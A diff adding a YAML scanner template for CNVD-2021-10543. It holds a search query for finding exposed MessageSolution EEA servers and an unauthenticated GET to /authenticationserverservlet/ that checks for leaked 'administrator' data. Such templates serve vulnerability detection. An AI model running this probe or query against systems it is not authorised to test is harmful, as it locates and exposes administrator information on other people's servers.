@@ -1,0 +1,18 @@
+name: MessageSolution EEA information disclosure CNVD-2021-10543
+manual: true
+query: title="MessageSolution Enterprise Email Archiving (EEA)"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /authenticationserverservlet/
+    expression: response.status == 200 && response.body.bcontains(b"administrator")
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-10543
+  description: Message solution enterprise e-mail archiving management system EEA
+    is an e-mail archiving system developed by Beijing Yixun Sida Technology Development
+    Co., Ltd.
+  tags: infoleak
